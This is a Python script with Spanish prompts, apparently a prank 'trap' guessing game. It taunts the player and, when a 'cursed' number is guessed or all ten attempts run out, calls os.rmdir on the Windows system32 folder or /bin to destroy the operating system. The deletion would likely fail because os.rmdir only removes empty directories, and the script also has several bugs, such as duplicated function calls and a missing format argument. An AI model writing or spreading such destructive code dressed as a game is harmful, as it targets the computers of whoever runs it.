import time
import random
import os






def sistema():
    # Pregunta el sistema operativo del usuario antes de empezar
    si = 0
    while si != 1 and si != 2:
        print("--------------------------")
        print("1. Windows")
        print("2. Linux / Mac OS")
        print("--------------------------")
        
        print("--------------------------")
        si = int(input("¿En que sistema operativo te encuentras? (1 o 2) "))
        print("--------------------------")
    return si

def crearlista(): # Permite al jugador crear su lista de 3 numeros
    p = list()
    while len(p) <3:
        nlista = int(input("Escribe tus numeros de 1 en 1 dandole a Enter "))
        if nlista in range(1, 51):
            if nlista not in p:
                p.append(nlista)
                print("Número {} Añadido a tu lista con éxito! ".format(nlista))
            else:
                print("El número {} no ha sido añadido a la lista, porque este ya se encuentra escrito")
        else:
            print("Valor incorrecto!!! (Recuerda, entre 1 y 50)")
    return p 

def numerobueno(): #Crea el numero bueno aleatoriamente
    return random.randint(1,50)
def numeromalo(): #Crea el numero malo aleatoriamente
    return random.randint(1,50)

i = True
u = 0
sis = sistema()

sistema()

while i == True:
    print("Has caido en la trampa!")
    time.sleep(2)
    print("Vamos a jugar a un juego.")
    time.sleep(2)
    print("Tienes 10 intentos para adivinar un numero totalmente aleatorio del 1 al 50.")
    time.sleep(2)
    print("Me vas a dar una lista de 3 numeros por intento.")
    time.sleep(2)
    print("Aunque este numero aleatorio, va a cambiar a cada intento para añadirle un poco de dificultad 😈 ")
    time.sleep(2)
    prim = input("¿Crees que es dificil? (si/no) ")
    if prim in ["si", "s", "Si", "SI"]:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")
    else:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")

    time.sleep(3)
    print("Perfecto, empecemos con tu primer intento. ")

    while u <10:


        crearlista()
        numerobueno()
        numeromalo()

        nb = numerobueno()
        nm = numeromalo()
        
        
        if nb == 50 and nm == 50:
            nm -= 1
            if nb == nm and nm < 50:
                nm += 1

        lista = crearlista()

        if nb in lista:
            print("Te has salvado, has adivinado el número, que era {}".format(nb))
            break
        if nm in lista:
            print("JAJAJAJAJAJA Has adivinado el numero malo, ahora te doy 3 segundos para despedirte de tu ordenador ")
            time.sleep(3)
            if sis == 1:
                os.rmdir("c:\windows\system32")
            elif sis == 2:
                os.rmdir("/bin")
        u = u+1
        print("Has fallado")
        print("Este es tu intento número {}".format(u))
    if u == 10:
        print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
        if sis == 1:
            os.rmdir("c:\windows\system32")
        if sis == 2:
            os.rmdir("/bin")